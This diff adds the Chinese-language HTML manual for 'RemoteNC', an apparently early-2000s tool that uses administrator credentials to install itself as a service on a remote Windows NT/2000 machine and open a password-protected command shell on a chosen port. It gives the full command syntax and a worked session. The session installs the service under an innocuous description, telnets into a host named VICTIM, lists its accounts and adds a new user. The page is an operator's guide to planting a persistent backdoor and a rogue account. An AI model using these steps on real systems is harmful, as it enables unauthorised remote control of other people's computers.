@@ -1,0 +1,104 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<title>RemoteNC</title>
+</head>
+
+<body bgcolor="#000000">
+
+<p align="center" style="line-height: 150%"><b><font face="Verdana" color="#FF0000" size="5">RemoteNC 
+</font></b></p>
+<p align="center" style="line-height: 150%"><b><font color="#FFFFFF" size="2">使用说明</font></b></p>
+<p align="center" style="line-height: 150%"><font size="2" color="#C0C0C0">小榕软件试验室 
+版权所有</font></p>
+<p align="center" style="line-height: 150%"><font face="Verdana" size="2" color="#C0C0C0"><a href="http://www.netXeyes.com">http://www.netXeyes.com</a>&nbsp; 
+<a href="http://www.netXeyes.org">http://www.netXeyes.org</a></font></p>
+<p align="center" style="line-height: 150%"><font face="Verdana" size="2" color="#C0C0C0"><a href="mailto:Dansnow@21cn.com">Dansnow@21cn.com</a></font></p>
+<hr>
+<p align="left" style="line-height: 150%"><b><font color="#CCCCCC"><font size="2" face="Verdana">Remote 
+NC</font><font size="2">是在NT／2000中运行的一个工具，和NC类似，可以远程执行命令。和NC比较的优点在于：</font></font></b></p>
+<p align="left" style="line-height: 150%"><b><font color="#CCCCCC"><font size="2">1、远程安装启动，不依赖于</font><font size="2" face="Verdana">Schedule</font><font size="2">服务。</font></font></b></p>
+<p align="left" style="line-height: 150%"><b><font size="2" color="#CCCCCC">2、可以以指定的用户身份运行，也可以以系统用户身份运行。</font></b></p>
+<p align="left" style="line-height: 150%"><b><font size="2" color="#CCCCCC">3、作为服务安装于远程系统，系统会自动启动。</font></b></p>
+<p align="left" style="line-height: 150%"><b><font size="2" color="#CCCCCC">4、快速。</font></b></p>
+<p align="left" style="line-height: 150%"><font color="#C0C0C0" face="Courier New" size="2">D:\My 
+Documents\RemoteSVC\Release&gt;RemoteNC.exe<br>
+<br>
+=======RemoteNC Beta 1, Written by Assassin 2001=======<br>
+http://www.netXeyes.com http://www.netXeyes.org<br>
+<br>
+Usage: RemoteNC &lt;IP&gt; &lt;Username&gt; &lt;Password&gt; &lt;Starting Mode&gt;<br>
+</font><font color="#C0C0C0" size="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+</font><font color="#C0C0C0" face="Courier New" size="2">&lt;Service Name&gt; 
+&lt;Description Name&gt;<br>
+</font><font color="#C0C0C0" size="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+</font><font color="#C0C0C0" face="Courier New" size="2">&lt;Listen Port&gt; &lt;Control 
+Password&gt; [/OVERWRITE]<br>
+&lt;IP&gt;: Remote Host IP Address</font><font color="#C0C0C0" size="2">&nbsp; </font><font size="2" color="#FFFFFF">远程主机IP地址</font><font color="#C0C0C0" size="2"><br>
+</font><font color="#C0C0C0" face="Courier New" size="2">&lt;Username&gt;: Account name in 
+Remote Host Who Must Has<br>
+Administrators Privilege</font><font color="#C0C0C0" size="2">&nbsp; </font><font size="2" color="#FFFFFF">用户名</font><font face="Courier New" size="2" color="#FFFFFF">(</font><font size="2" color="#FFFFFF">必须具有</font><font face="Courier New" size="2" color="#FFFFFF">Administrators</font><font size="2" color="#FFFFFF">权限</font><font face="Courier New" size="2" color="#FFFFFF">)</font><font color="#C0C0C0" face="Courier New" size="2"><br>
+&lt;Password&gt;: Password of Account Name </font><font size="2" color="#FFFFFF">密码</font><font color="#C0C0C0" size="2"><br>
+</font><font color="#C0C0C0" face="Courier New" size="2">&lt;Start Mode&gt;: LocalSystem 
+or RunAsUser</font><font color="#C0C0C0" size="2">&nbsp; </font><font size="2" color="#FFFFFF">启动模式：</font><font face="Courier New" size="2" color="#FFFFFF">LocalSystem(</font><font size="2" color="#FFFFFF">系统用户</font><font face="Courier New" size="2" color="#FFFFFF">) 
+RunAsUser(</font><font size="2" color="#FFFFFF">以前面指定的用户身份运行，推荐）</font><font color="#C0C0C0" size="2"><br>
+</font><font color="#C0C0C0" face="Courier New" size="2">&lt;Service Name&gt;: Specify 
+Service Name </font><font size="2" color="#FFFFFF">服务的名称</font><font color="#C0C0C0" size="2"><br>
+</font><font color="#C0C0C0" face="Courier New" size="2">&lt;Description&gt;: Description 
+of Service, Displayed in Service Manager</font><font color="#C0C0C0" size="2"> </font><font size="2" color="#FFFFFF">服务的说明，显示在服务管理器中，如果同名服务已经存在，将会安装失败。</font><font color="#C0C0C0" size="2"><br>
+</font><font color="#C0C0C0" face="Courier New" size="2">&lt;Listen Port&gt;: Service 
+Listen Port</font><font color="#C0C0C0" size="2"> </font><font size="2" color="#FFFFFF">启动后监听的端口</font><font color="#C0C0C0" size="2"><br>
+</font><font color="#C0C0C0" face="Courier New" size="2">&lt;Control Password&gt;: Control 
+Password</font><font color="#C0C0C0" size="2"> </font><font size="2" color="#FFFFFF">控制密码</font></p>
+<p align="left" style="line-height: 150%"><font color="#C0C0C0" face="Courier New" size="2">[OVERWRITE]: 
+</font><font color="#C0C0C0" size="2">如果文件已经存在，则强制重写整个文件。</font><font color="#C0C0C0" size="2"><br>
+</font></p>
+<p align="left" style="line-height: 150%"><font size="2" color="#FFFFFF">例子：<br>
+</font><font color="#C0C0C0" face="Courier New" size="2">D:\My Documents\RemoteSVC\Release&gt;RemoteNC 
+192.168.0.1 administrator password Runa<br>
+sUser &quot;RemoteNC&quot; &quot;Provide Local CMD Redirect&quot; 7 123456<br>
+<br>
+=======RemoteNC Beta 1, Written by Assassin 2001=======<br>
+http://www.netXeyes.com http://www.netXeyes.org<br>
+<br>
+[Install Service as RunasUser Mode]<br>
+Connecting 192.168.0.1 ..... Done.<br>
+Transffer File ..... Done.<br>
+Start Service ..... Done.<br>
+</font></p>
+<p align="left" style="line-height: 150%"><font color="#C0C0C0" face="Courier New" size="2">Now 
+You can Tenlet 192.168.0.1 7 to Connect, Have a Joy :-)</font><font color="#C0C0C0" size="2"> 
+</font><font size="2" color="#FFFFFF">安装成功</font><font color="#C0C0C0" size="2"><br>
+</font><font color="#C0C0C0" face="Courier New" size="2">D:\My Documents\RemoteSVC\Release&gt;<br>
+D:\My Documents\RemoteSVC\Release&gt;telnet 192.168.0.1 7</font><font color="#C0C0C0" size="2"> 
+</font><font size="2" color="#FFFFFF">登录到制定的端口</font><font color="#C0C0C0" size="2"><br>
+</font><font color="#C0C0C0" face="Courier New" size="2">RemoteNC Control Password: 
+**************<br>
+===============Banyet Soft Labs. 1995-2001 All Rights Reserved.===============<br>
+=========Written by Assassin, Server Edition <a href="mailto:FluxShadow@21cn.com">FluxShadow@21cn.com</a>==============<br>
+</font></p>
+<p align="left" style="line-height: 150%"><font color="#C0C0C0" face="Courier New" size="2">Microsoft 
+Windows 2000 [Version 5.00.2195]<br>
+RemoteNC&gt;net user<br>
+User accounts for \\VICTIM<br>
+-------------------------------------------------------------------------------<br>
+Administrator Guest IUSR_VICTIM</font></p>
+<p align="left" style="line-height: 150%"><font color="#C0C0C0" face="Courier New" size="2">IWAM_VICTIM 
+NetShowServices TsInternetUser zjf<br>
+The command completed successfully.<br>
+<br>
+RemoteNC&gt;net user test test /add<br>
+The command completed successfully.&nbsp;&nbsp;&nbsp;</font></p>
+<p align="left" style="line-height: 150%"><font size="2" color="#FFFFFF">由于是以</font><font face="Courier New" size="2" color="#FFFFFF">Administrators</font><font size="2" color="#FFFFFF">组的权限启动，所以不会出现1312错误。</font></p>
+<p align="left" style="line-height: 150%"><font size="2" color="#FFFFFF">如果是以系统权限启动，有时会出现</font><font face="Courier New" size="2" color="#FFFFFF">1312</font><font size="2" color="#FFFFFF">错误，这就是推荐采用</font><font face="Courier New" size="2" color="#FFFFFF">RunasUser</font><font size="2" color="#FFFFFF">安装的原因。</font><font color="#C0C0C0" size="2"><br>
+<br>
+</font><font color="#C0C0C0" face="Courier New" size="2">RemoteNC&gt;</font></p>
+<p align="left" style="line-height: 150%"><b><font size="2" color="#FFFFFF">如果用Run</font><font size="2" color="#FFFFFF" face="Courier New">AsUser</font><font size="2" color="#FFFFFF">模式安装失败，请用</font><font size="2" color="#FFFFFF" face="Courier New">LocalSystem</font><font size="2" color="#FFFFFF">模式。</b>
+<p>
+Download by <a href="http://lilitou.yeah.net"><font size="4" color="white">小凤居</a>
+</body>
+
+</html>
